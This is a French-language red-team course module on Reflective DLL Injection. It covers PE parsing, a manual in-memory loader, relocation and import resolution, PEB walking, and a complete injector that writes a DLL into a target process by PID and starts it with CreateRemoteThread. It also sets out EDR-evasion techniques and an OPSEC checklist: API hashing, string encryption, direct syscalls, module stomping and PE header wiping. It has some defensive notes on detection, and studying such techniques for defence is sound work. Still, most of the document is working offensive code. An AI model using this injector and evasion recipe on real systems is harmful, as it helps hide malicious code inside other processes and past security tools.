# Module W32 : Reflective DLL Injection

## Objectifs d'apprentissage

A la fin de ce module, vous serez capable de :
- Comprendre les limitations du chargement classique de DLL
- Implémenter un loader PE manuel en mémoire
- Développer une DLL réflective complète
- Parser et manipuler les structures PE (headers, sections, imports, relocations)
- Contourner les détections basées sur le disque
- Appliquer les techniques de Stephen Fewer en contexte Red Team

**Niveau** : Intermédiaire/Avancé
**Prérequis** : DLL Injection classique, format PE, API Windows
**Durée estimée** : 6-8 heures

---

## 1. Pourquoi Reflective DLL Injection ?

### 1.1 Limitations du chargement classique

Avec une DLL injection traditionnelle (CreateRemoteThread + LoadLibrary), le flux est :

```ascii
INJECTION CLASSIQUE :

[Attacker]                    [Target Process]
    |                              |
    | 1. WriteProcessMemory        |
    |    (path to DLL)             |
    |---------------------------> |
    |                              |
    | 2. CreateRemoteThread        |
    |    (LoadLibrary)             |
    |---------------------------> |
    |                         LoadLibrary("C:\\evil.dll")
    |                              |
    |                         [DISQUE] ← Lecture fichier
    |                              |
    |                         Windows Loader
    |                              |
    |                         DLL chargée
```

**Problèmes** :
- DLL doit exister sur le disque (détection antivirus)
- CreateFile/LoadLibrary génèrent des événements (ETW, Sysmon)
- Signature de fichier analysable
- Laisse des traces (MFT, prefetch, etc.)

### 1.2 Principe de Reflective Loading

```ascii
REFLECTIVE LOADING :

[Attacker]                    [Target Process]
    |                              |
    | 1. WriteProcessMemory        |
    |    (DLL complète en buffer)  |
    |---------------------------> |
    |                              |
    | 2. CreateRemoteThread        |
    |    (ReflectiveLoader)        |
    |---------------------------> |
    |                         ReflectiveLoader()
    |                              |
    |                         [MÉMOIRE UNIQUEMENT]
    |                              |
    |                         1. Parse PE
    |                         2. Alloue mémoire
    |                         3. Copie sections
    |                         4. Relocations
    |                         5. Résout imports
    |                         6. Call DllMain
    |                              |
    |                         DLL active (furtive)
```

**Avantages** :
- Pas de fichier sur disque
- Pas de LoadLibrary (évite hooks)
- Contrôle total du processus de chargement
- Difficile à détecter par analyse statique

**Analogie** : Imaginez construire un meuble IKEA. Normalement, vous lisez le manuel (LoadLibrary), Windows assemble pour vous. Avec Reflective Loading, vous êtes le menuisier : vous lisez les plans (PE headers), coupez les planches (sections), montez tout manuellement (relocations/imports), et livrez le meuble fini.

---

## 2. Structure PE et parsing manuel

### 2.1 Rappel structure PE

```ascii
FICHIER DLL (sur disque ou en mémoire) :

+---------------------------+
| DOS Header                | ← "MZ" signature
|   e_lfanew ───────────┐   |
+---------------------------+
| DOS Stub                  |
+---------------------------+ ←─┘
| PE Signature "PE\0\0"     |
+---------------------------+
| FILE_HEADER               |
|   NumberOfSections        |
|   SizeOfOptionalHeader    |
+---------------------------+
| OPTIONAL_HEADER           |
|   ImageBase               | ← Adresse préférée
|   SizeOfImage             | ← Taille totale en mémoire
|   AddressOfEntryPoint     | ← DllMain
|   DataDirectory[...]      | ← Imports, Exports, Relocations
+---------------------------+
| Section Headers           |
|   .text (code)            |
|   .data (variables)       |
|   .rdata (constantes)     |
|   .reloc (relocations)    |
+---------------------------+
| Section Data              |
|   Contenu des sections    |
+---------------------------+
```

### 2.2 Structures clés en C

```c
// Headers PE simplifiés
typedef struct {
    WORD  e_magic;      // "MZ"
    // ... champs inutiles
    LONG  e_lfanew;     // Offset vers PE header
} IMAGE_DOS_HEADER;

typedef struct {
    WORD  Machine;
    WORD  NumberOfSections;
    DWORD TimeDateStamp;
    DWORD PointerToSymbolTable;
    DWORD NumberOfSymbols;
    WORD  SizeOfOptionalHeader;
    WORD  Characteristics;
} IMAGE_FILE_HEADER;

typedef struct {
    WORD  Magic;                    // 0x10B (32-bit) ou 0x20B (64-bit)
    DWORD SizeOfCode;
    DWORD SizeOfInitializedData;
    DWORD AddressOfEntryPoint;      // RVA de DllMain
    ULONGLONG ImageBase;            // Adresse préférée
    DWORD SectionAlignment;
    DWORD FileAlignment;
    DWORD SizeOfImage;              // Taille totale
    DWORD SizeOfHeaders;
    IMAGE_DATA_DIRECTORY DataDirectory[16];
} IMAGE_OPTIONAL_HEADER;

typedef struct {
    BYTE  Name[8];
    DWORD VirtualSize;
    DWORD VirtualAddress;           // RVA en mémoire
    DWORD SizeOfRawData;
    DWORD PointerToRawData;         // Offset dans le fichier
    DWORD Characteristics;          // Flags (execute, read, write)
} IMAGE_SECTION_HEADER;
```

### 2.3 Parsing initial

```c
// Obtenir les headers depuis un buffer DLL
PIMAGE_DOS_HEADER GetDosHeader(PVOID dllBuffer) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBuffer;

    if (dosHeader->e_magic != 0x5A4D) {  // "MZ"
        return NULL;  // Pas un PE valide
    }

    return dosHeader;
}

PIMAGE_NT_HEADERS GetNtHeaders(PVOID dllBuffer) {
    PIMAGE_DOS_HEADER dosHeader = GetDosHeader(dllBuffer);
    if (!dosHeader) return NULL;

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(
        (BYTE*)dllBuffer + dosHeader->e_lfanew
    );

    if (ntHeaders->Signature != 0x4550) {  // "PE\0\0"
        return NULL;
    }

    return ntHeaders;
}
```

---

## 3. Implémentation du ReflectiveLoader

### 3.1 Fonction centrale : ReflectiveLoader

Cette fonction est **exportée** par la DLL et s'auto-charge en mémoire.

```c
// Définition du point d'entrée réflectif
ULONG_PTR WINAPI ReflectiveLoader(VOID);

// Macro pour trouver l'adresse de base de notre DLL en mémoire
#define DEREF( name )*(UINT_PTR *)(name)
#define DEREF_64( name )*(DWORD64 *)(name)
#define DEREF_32( name )*(DWORD *)(name)
#define DEREF_16( name )*(WORD *)(name)
#define DEREF_8( name )*(BYTE *)(name)

// Trouver notre propre base en scannant depuis le pointeur de pile
ULONG_PTR GetBaseAddress(VOID) {
    ULONG_PTR addr = (ULONG_PTR)&GetBaseAddress;

    // Descendre page par page (4096 bytes)
    addr &= 0xFFFFFFFFFFFFF000;  // Aligner sur page

    while (TRUE) {
        // Vérifier si c'est un header PE valide
        if (((PIMAGE_DOS_HEADER)addr)->e_magic == 0x5A4D) {
            PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)addr;
            PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(addr + dosHeader->e_lfanew);

            if (ntHeaders->Signature == 0x4550) {
                return addr;  // Trouvé !
            }
        }

        addr -= 0x1000;  // Page précédente
    }
}
```

### 3.2 Loader complet (version simplifiée)

```c
ULONG_PTR WINAPI ReflectiveLoader(VOID) {
    // 1. TROUVER NOTRE ADRESSE DE BASE
    ULONG_PTR baseAddr = GetBaseAddress();
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddr;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(baseAddr + dosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER optHeader = &ntHeaders->OptionalHeader;

    // 2. RÉSOUDRE LES API NÉCESSAIRES (on ne peut pas les importer normalement)
    // Récupération manuelle de kernel32.dll et ses fonctions
    HMODULE hKernel32 = GetKernel32Handle();

    // Résolution manuelle des API
    pVirtualAlloc MyVirtualAlloc = (pVirtualAlloc)GetProcAddressManual(
        hKernel32, "VirtualAlloc"
    );
    pLoadLibraryA MyLoadLibraryA = (pLoadLibraryA)GetProcAddressManual(
        hKernel32, "LoadLibraryA"
    );
    // ... autres API

    // 3. ALLOUER MÉMOIRE POUR LA NOUVELLE IMAGE
    PVOID newBase = MyVirtualAlloc(
        NULL,
        optHeader->SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!newBase) return 0;

    // 4. COPIER LES HEADERS
    memcpy(newBase, (PVOID)baseAddr, optHeader->SizeOfHeaders);

    // 5. COPIER LES SECTIONS
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        PVOID sectionDest = (BYTE*)newBase + section->VirtualAddress;
        PVOID sectionSrc = (BYTE*)baseAddr + section->PointerToRawData;

        memcpy(sectionDest, sectionSrc, section->SizeOfRawData);
        section++;
    }

    // 6. TRAITER LES RELOCATIONS
    // (voir section détaillée ci-dessous)
    ProcessRelocations(newBase, baseAddr, ntHeaders);

    // 7. RÉSOUDRE LES IMPORTS
    // (voir section détaillée ci-dessous)
    ResolveImports(newBase, ntHeaders, MyLoadLibraryA, MyGetProcAddress);

    // 8. FINALISER LES PROTECTIONS MÉMOIRE
    FinalizeProtections(newBase, ntHeaders);

    // 9. APPELER DllMain
    typedef BOOL (WINAPI *pDllMain)(HINSTANCE, DWORD, LPVOID);
    pDllMain DllMain = (pDllMain)((BYTE*)newBase + optHeader->AddressOfEntryPoint);

    DllMain((HINSTANCE)newBase, DLL_PROCESS_ATTACH, NULL);

    // Retourner l'adresse de base pour usage ultérieur
    return (ULONG_PTR)newBase;
}
```

---

## 4. Relocations : Adapter les adresses

### 4.1 Pourquoi les relocations ?

Les DLL sont compilées avec une adresse de base préférée (ImageBase, souvent 0x10000000). Si cette adresse n'est pas disponible, Windows doit "relocaliser" toutes les adresses hardcodées.

```ascii
AVANT RELOCATION (ImageBase = 0x10000000) :

.text section :
  MOV EAX, [0x10002000]  ← Adresse absolue
  CALL 0x10001500        ← Adresse absolue

APRÈS RELOCATION (chargé à 0x20000000) :

  MOV EAX, [0x20002000]  ← Corrigé (+0x10000000)
  CALL 0x20001500        ← Corrigé (+0x10000000)
```

### 4.2 Table de relocations

La section `.reloc` contient des entrées indiquant **où** corriger les adresses.

```c
typedef struct {
    DWORD VirtualAddress;  // RVA de la page à patcher
    DWORD SizeOfBlock;     // Taille de ce bloc
    // Suivi par des entrées WORD
} IMAGE_BASE_RELOCATION;

// Format d'une entrée de relocation (WORD) :
// Bits 0-11  : Offset dans la page
// Bits 12-15 : Type (IMAGE_REL_BASED_HIGHLOW, etc.)
```

### 4.3 Implémentation

```c
void ProcessRelocations(PVOID newBase, ULONG_PTR oldBase, PIMAGE_NT_HEADERS ntHeaders) {
    LONGLONG delta = (LONGLONG)newBase - ntHeaders->OptionalHeader.ImageBase;

    if (delta == 0) return;  // Pas besoin de relocations

    // Récupérer la table de relocations
    IMAGE_DATA_DIRECTORY relocDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (relocDir.Size == 0) return;  // Pas de relocations

    PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)newBase + relocDir.VirtualAddress);

    while (reloc->VirtualAddress) {
        BYTE* dest = (BYTE*)newBase + reloc->VirtualAddress;
        WORD* relocData = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));

        int numRelocations = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

        for (int i = 0; i < numRelocations; i++) {
            int type = relocData[i] >> 12;
            int offset = relocData[i] & 0xFFF;

            if (type == IMAGE_REL_BASED_DIR64) {
                // 64-bit : ajouter le delta
                ULONGLONG* patchAddr = (ULONGLONG*)(dest + offset);
                *patchAddr += delta;
            }
            else if (type == IMAGE_REL_BASED_HIGHLOW) {
                // 32-bit : ajouter le delta
                DWORD* patchAddr = (DWORD*)(dest + offset);
                *patchAddr += (DWORD)delta;
            }
        }

        // Bloc suivant
        reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
    }
}
```

---

## 5. Résolution des imports (IAT)

### 5.1 Import Address Table (IAT)

Les DLL importent des fonctions depuis d'autres DLL (kernel32.dll, ntdll.dll, etc.). L'IAT contient les adresses résolues.

```ascii
AVANT RÉSOLUTION :

Import Directory :
  kernel32.dll
    - CreateFileA    → NULL (pas encore résolu)
    - WriteFile      → NULL
  ntdll.dll
    - NtQuerySystemInformation → NULL

APRÈS RÉSOLUTION :

Import Directory :
  kernel32.dll
    - CreateFileA    → 0x7FFA12340000
    - WriteFile      → 0x7FFA12340450
  ntdll.dll
    - NtQuerySystemInformation → 0x7FFA10001200
```

### 5.2 Implémentation

```c
void ResolveImports(PVOID base, PIMAGE_NT_HEADERS ntHeaders,
                    pLoadLibraryA MyLoadLibraryA,
                    pGetProcAddress MyGetProcAddress) {

    IMAGE_DATA_DIRECTORY importDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.Size == 0) return;

    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)base + importDir.VirtualAddress);

    while (importDesc->Name) {
        // Nom de la DLL à importer
        char* dllName = (char*)((BYTE*)base + importDesc->Name);

        // Charger la DLL
        HMODULE hModule = MyLoadLibraryA(dllName);

        // Parcourir les fonctions importées
        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)base + importDesc->FirstThunk);
        PIMAGE_THUNK_DATA origThunk = (PIMAGE_THUNK_DATA)((BYTE*)base + importDesc->OriginalFirstThunk);

        while (origThunk->u1.AddressOfData) {
            FARPROC funcAddr;

            if (origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                // Import par ordinal
                WORD ordinal = IMAGE_ORDINAL(origThunk->u1.Ordinal);
                funcAddr = MyGetProcAddress(hModule, (LPCSTR)ordinal);
            } else {
                // Import par nom
                PIMAGE_IMPORT_BY_NAME importName = (PIMAGE_IMPORT_BY_NAME)(
                    (BYTE*)base + origThunk->u1.AddressOfData
                );
                funcAddr = MyGetProcAddress(hModule, importName->Name);
            }

            // Écrire l'adresse dans l'IAT
            thunk->u1.Function = (ULONG_PTR)funcAddr;

            thunk++;
            origThunk++;
        }

        importDesc++;
    }
}
```

---

## 6. Résolution manuelle des API Windows

**Problème** : Dans ReflectiveLoader, on ne peut pas utiliser `LoadLibrary` ou `GetProcAddress` directement (ils ne sont pas encore importés). Il faut les résoudre manuellement.

### 6.1 Trouver kernel32.dll

```c
HMODULE GetKernel32Handle(VOID) {
    // Technique : parcourir le PEB (Process Environment Block)
    #ifdef _WIN64
        PPEB peb = (PPEB)__readgsqword(0x60);
    #else
        PPEB peb = (PPEB)__readfsdword(0x30);
    #endif

    // Lister les modules chargés (InLoadOrderModuleList)
    PLIST_ENTRY moduleList = &peb->Ldr->InLoadOrderModuleList;
    PLIST_ENTRY current = moduleList->Flink;

    while (current != moduleList) {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

        // Vérifier si c'est kernel32.dll (comparaison de chaînes Unicode)
        if (wcsstr(entry->BaseDllName.Buffer, L"KERNEL32.DLL")) {
            return (HMODULE)entry->DllBase;
        }

        current = current->Flink;
    }

    return NULL;
}
```

### 6.2 GetProcAddress manuel

```c
FARPROC GetProcAddressManual(HMODULE hModule, LPCSTR lpProcName) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);

    IMAGE_DATA_DIRECTORY exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDir.VirtualAddress);

    DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + exports->AddressOfFunctions);
    DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exports->AddressOfNames);
    WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exports->AddressOfNameOrdinals);

    // Recherche par nom
    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        char* funcName = (char*)((BYTE*)hModule + addressOfNames[i]);

        if (strcmp(funcName, lpProcName) == 0) {
            WORD ordinal = addressOfNameOrdinals[i];
            DWORD funcRVA = addressOfFunctions[ordinal];

            return (FARPROC)((BYTE*)hModule + funcRVA);
        }
    }

    return NULL;
}
```

---

## 7. Injection depuis un processus externe

### 7.1 Injector complet

```c
#include <windows.h>
#include <stdio.h>

// Lire la DLL depuis le disque (ou téléchargement, etc.)
BOOL ReadDllToMemory(const char* path, PVOID* buffer, DWORD* size) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    *size = GetFileSize(hFile, NULL);
    *buffer = malloc(*size);

    DWORD bytesRead;
    ReadFile(hFile, *buffer, *size, &bytesRead, NULL);
    CloseHandle(hFile);

    return TRUE;
}

// Trouver l'offset de ReflectiveLoader dans la DLL
DWORD GetReflectiveLoaderOffset(PVOID dllBuffer) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBuffer;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)dllBuffer + dosHeader->e_lfanew);

    IMAGE_DATA_DIRECTORY exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)dllBuffer + exportDir.VirtualAddress);

    DWORD* addressOfFunctions = (DWORD*)((BYTE*)dllBuffer + exports->AddressOfFunctions);
    DWORD* addressOfNames = (DWORD*)((BYTE*)dllBuffer + exports->AddressOfNames);
    WORD* addressOfNameOrdinals = (WORD*)((BYTE*)dllBuffer + exports->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        char* funcName = (char*)((BYTE*)dllBuffer + addressOfNames[i]);

        if (strcmp(funcName, "ReflectiveLoader") == 0) {
            WORD ordinal = addressOfNameOrdinals[i];
            return addressOfFunctions[ordinal];
        }
    }

    return 0;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("Usage: %s <PID> <reflective.dll>\n", argv[0]);
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    const char* dllPath = argv[2];

    // 1. Lire la DLL
    PVOID dllBuffer;
    DWORD dllSize;
    if (!ReadDllToMemory(dllPath, &dllBuffer, &dllSize)) {
        printf("[-] Erreur lecture DLL\n");
        return 1;
    }

    printf("[+] DLL chargée : %d bytes\n", dllSize);

    // 2. Trouver ReflectiveLoader
    DWORD loaderOffset = GetReflectiveLoaderOffset(dllBuffer);
    if (!loaderOffset) {
        printf("[-] ReflectiveLoader introuvable\n");
        return 1;
    }

    printf("[+] ReflectiveLoader offset : 0x%X\n", loaderOffset);

    // 3. Ouvrir le processus cible
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("[-] Erreur OpenProcess\n");
        return 1;
    }

    // 4. Allouer mémoire dans le processus cible
    PVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, dllSize,
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_EXECUTE_READWRITE);
    if (!remoteBuffer) {
        printf("[-] Erreur VirtualAllocEx\n");
        return 1;
    }

    printf("[+] Buffer distant : 0x%p\n", remoteBuffer);

    // 5. Écrire la DLL dans le processus cible
    WriteProcessMemory(hProcess, remoteBuffer, dllBuffer, dllSize, NULL);

    // 6. Calculer l'adresse de ReflectiveLoader dans le processus cible
    LPTHREAD_START_ROUTINE loaderAddr = (LPTHREAD_START_ROUTINE)(
        (BYTE*)remoteBuffer + loaderOffset
    );

    printf("[+] ReflectiveLoader distant : 0x%p\n", loaderAddr);

    // 7. Créer un thread pour exécuter ReflectiveLoader
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, loaderAddr, NULL, 0, NULL);
    if (!hThread) {
        printf("[-] Erreur CreateRemoteThread\n");
        return 1;
    }

    printf("[+] Thread créé, injection réussie !\n");

    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    free(dllBuffer);

    return 0;
}
```

---

## 8. Techniques avancées de Stephen Fewer

Stephen Fewer est l'auteur de la technique Reflective DLL Injection. Ses optimisations :

### 8.1 Position-Independent Code (PIC)

Le ReflectiveLoader doit être **position-independent** : il fonctionne quelle que soit son adresse.

**Techniques** :
- Pas de variables globales
- Pas d'imports directs
- Calcul d'adresses relatives uniquement

```c
// Mauvais (adresse absolue)
extern char globalVar;
char* ptr = &globalVar;

// Bon (relatif au RIP sur x64)
__declspec(noinline) char* GetGlobalVar() {
    static char localVar;
    return &localVar;
}
```

### 8.2 Hash des API

Pour réduire la signature, hasher les noms d'API au lieu de les stocker en clair.

```c
#define HASH_VIRTUALALLOC 0x91AFCA54
#define HASH_LOADLIBRARYA 0x0726774C

DWORD HashString(const char* str) {
    DWORD hash = 0;
    while (*str) {
        hash = ((hash << 5) + hash) + *str++;
    }
    return hash;
}

FARPROC GetProcAddressByHash(HMODULE hModule, DWORD hash) {
    // Parcourir les exports et comparer les hash
    // ...
}
```

### 8.3 Syscalls directs

Éviter les hooks userland en appelant directement les syscalls (ntdll.dll).

```c
typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

// Résoudre manuellement
pNtAllocateVirtualMemory MyNtAllocateVirtualMemory =
    (pNtAllocateVirtualMemory)GetProcAddressManual(hNtdll, "NtAllocateVirtualMemory");
```

---

## 9. Détection et OPSEC (Operational Security)

### 9.1 Vecteurs de détection

```ascii
DÉTECTIONS POSSIBLES :

1. ANALYSE STATIQUE :
   - Présence de "ReflectiveLoader" dans exports
   - Strings suspectes ("VirtualAlloc", "GetProcAddress")
   - Structures PE non standards

2. ANALYSE DYNAMIQUE :
   - VirtualAllocEx avec PAGE_EXECUTE_READWRITE
   - WriteProcessMemory + CreateRemoteThread (pattern classique)
   - Absence de module dans PEB (phantom DLL)

3. HOOKS ET MONITORING :
   - ETW (Event Tracing for Windows)
   - Kernel callbacks (PsSetLoadImageNotifyRoutine)
   - EDR hooks sur CreateRemoteThread

4. ANALYSE MÉMOIRE :
   - Régions RWX (Read-Write-Execute)
   - PE header en mémoire sans fichier associé
   - Import Address Table non standard
```

### 9.2 Techniques d'évasion

**1. Obfuscation**
```c
// Renommer ReflectiveLoader
#pragma comment(linker, "/EXPORT:Init=ReflectiveLoader")

// Chiffrer les strings
const char encryptedAPI[] = { 0x56, 0x69, 0x72, ... };  // "VirtualAlloc" XOR
```

**2. Protections mémoire progressives**
```c
// Éviter RWX permanent
VirtualAlloc(..., PAGE_READWRITE);  // Phase 1 : copie
VirtualProtect(..., PAGE_EXECUTE_READ);  // Phase 2 : exécution
```

**3. Alternatives à CreateRemoteThread**
- NtCreateThreadEx (syscall direct)
- QueueUserAPC (thread hijacking)
- SetThreadContext (thread suspension)

**4. Module Stomping**
```c
// Remplacer une DLL légitime déjà chargée
HMODULE hLegit = LoadLibrary("legitimate.dll");
// Écraser son code avec notre payload
WriteProcessMemory(hProcess, hLegit, reflectiveDLL, size, NULL);
```

**5. Nettoyage du PE header**
```c
// Effacer "MZ" et "PE" pour éviter la détection
memset(newBase, 0, 0x1000);  // Effacer le header après chargement
```

### 9.3 Checklist OPSEC

- [ ] Pas de strings en clair (VirtualAlloc, LoadLibrary, etc.)
- [ ] Hash des API au lieu de noms
- [ ] Protections mémoire minimales (pas de RWX si possible)
- [ ] Nettoyer le PE header après chargement
- [ ] Utiliser syscalls directs (ntdll.dll)
- [ ] Éviter CreateRemoteThread (utiliser alternatives)
- [ ] Tester contre EDR (Windows Defender, CrowdStrike, etc.)
- [ ] Vérifier absence de logs ETW
- [ ] Module Stomping si possible
- [ ] Délais aléatoires (éviter détection temporelle)

---

## 10. Compilation et utilisation

### 10.1 Compiler la DLL réflective

**Structure du projet** :
```
reflective_dll/
├── ReflectiveLoader.c    (implémentation du loader)
├── PayloadDLL.c          (code malveillant/légitime)
├── ReflectiveLoader.h
└── Makefile
```

**Flags de compilation critiques** :
```bash
# Visual Studio (cl.exe)
cl /LD /Ox /GS- /DNDEBUG /MT PayloadDLL.c ReflectiveLoader.c /link /OUT:payload.dll

# MinGW (gcc)
gcc -shared -o payload.dll PayloadDLL.c ReflectiveLoader.c -O2 -fno-stack-protector -s

# Options importantes :
# /LD ou -shared : créer une DLL
# /Ox ou -O2 : optimisations
# /GS- : désactiver stack canaries
# /MT : runtime statique
# -s : strip symbols (réduire signature)
```

**Exporter ReflectiveLoader** :
```c
// Dans le code
__declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(VOID);

// Ou dans un fichier .def
EXPORTS
    ReflectiveLoader
```

### 10.2 Utilisation

```bash
# 1. Compiler la DLL
cl /LD payload.c ReflectiveLoader.c /link /OUT:payload.dll

# 2. Compiler l'injector
cl injector.c

# 3. Injecter dans un processus (PID 1234)
injector.exe 1234 payload.dll

# 4. Vérifier injection (Process Hacker, Process Explorer)
# La DLL n'apparaîtra PAS dans la liste des modules !
```

---

## 11. Exercices pratiques

### Exercice 1 : Parser PE basique
**Objectif** : Écrire un programme qui affiche les sections d'une DLL.

```c
// Afficher : nom, VirtualAddress, VirtualSize, Characteristics
void DisplaySections(const char* dllPath) {
    // TODO
}
```

**Critères** :
- Ouvrir le fichier DLL
- Parser DOS header, NT headers
- Itérer sur les sections
- Afficher les informations formatées

### Exercice 2 : Résolution manuelle d'API
**Objectif** : Implémenter GetProcAddress manuellement.

```c
FARPROC MyGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
    // TODO : parcourir l'Export Directory
}
```

**Test** :
```c
HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
FARPROC addr = MyGetProcAddress(hKernel32, "VirtualAlloc");
printf("VirtualAlloc : 0x%p\n", addr);
```

### Exercice 3 : Loader minimal
**Objectif** : Créer un loader qui charge une DLL en mémoire (même processus).

**Étapes** :
1. Lire DLL dans un buffer
2. Allouer mémoire (VirtualAlloc)
3. Copier headers + sections
4. Traiter relocations
5. Résoudre imports
6. Appeler DllMain

**Bonus** : Charger une DLL qui affiche "Hello from reflective DLL!"

### Exercice 4 : Injection complète
**Objectif** : Injecter une DLL réflective dans notepad.exe.

**Étapes** :
1. Créer une DLL avec ReflectiveLoader et MessageBox dans DllMain
2. Compiler la DLL
3. Créer un injector (voir section 7.1)
4. Lancer notepad.exe
5. Injecter et observer la MessageBox

---

## 12. Ressources et références

### Code source de référence
- **Stephen Fewer - Reflective DLL Injection** : [github.com/stephenfewer/ReflectiveDLLInjection](https://github.com/stephenfewer/ReflectiveDLLInjection)
- **Metasploit Meterpreter** : Utilise Reflective DLL (stage2)

### Documentation
- **PE Format (Microsoft)** : [Microsoft PE/COFF Specification](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format)
- **Windows Internals Part 1** (Chapitre 3 : Processes and Threads)
- **Malware Analyst's Cookbook** (Chapitre 11 : DLL Injection)

### Outils d'analyse
- **PE-bear** : Analyser structures PE graphiquement
- **Process Hacker** : Voir modules chargés (phantoms visibles)
- **WinDbg** : Débogage low-level
- **Sysmon** : Monitoring des injections (EventID 8, 10)

### Défense
- **AMSI (Antimalware Scan Interface)** : Scanne buffers en mémoire
- **CFG (Control Flow Guard)** : Empêche exécution arbitraire
- **ACG (Arbitrary Code Guard)** : Bloque allocations RWX

---

## 13. Points clés à retenir

1. **Reflective DLL = loader manuel** sans passer par LoadLibrary
2. **Pas de fichier sur disque** = meilleure furtivité
3. **Relocations** : ajuster les adresses absolues (delta = newBase - ImageBase)
4. **IAT** : résoudre LoadLibrary + GetProcAddress pour chaque import
5. **ReflectiveLoader** doit être position-independent (PIC)
6. **OPSEC** : hash API, protections mémoire, syscalls directs
7. **Détection** : VirtualAllocEx RWX, absence module dans PEB, ETW

---

## 14. Checklist de maîtrise

Avant de passer au module suivant, vous devez être capable de :

- [ ] Expliquer la différence entre DLL injection classique et reflective
- [ ] Parser manuellement un PE (DOS header, NT headers, sections)
- [ ] Implémenter GetProcAddress manuellement (Export Directory)
- [ ] Calculer et appliquer des relocations (table .reloc)
- [ ] Résoudre l'IAT (Import Directory)
- [ ] Écrire un ReflectiveLoader fonctionnel (même processus)
- [ ] Injecter une DLL réflective dans un processus externe
- [ ] Identifier les vecteurs de détection EDR
- [ ] Appliquer au moins 3 techniques d'évasion (hash API, syscalls, etc.)
- [ ] Compiler une DLL réflective sans erreurs

**Prochaine étape** : Module W33 - Process Hollowing (création de processus suspendus)

---

**Durée estimée pour ce module** : 6-8 heures (théorie + pratique)
**Difficulté** : 8/10
**Prérequis indispensables** : DLL Injection, format PE, API Windows, debugger

Bon courage dans votre apprentissage de cette technique avancée !
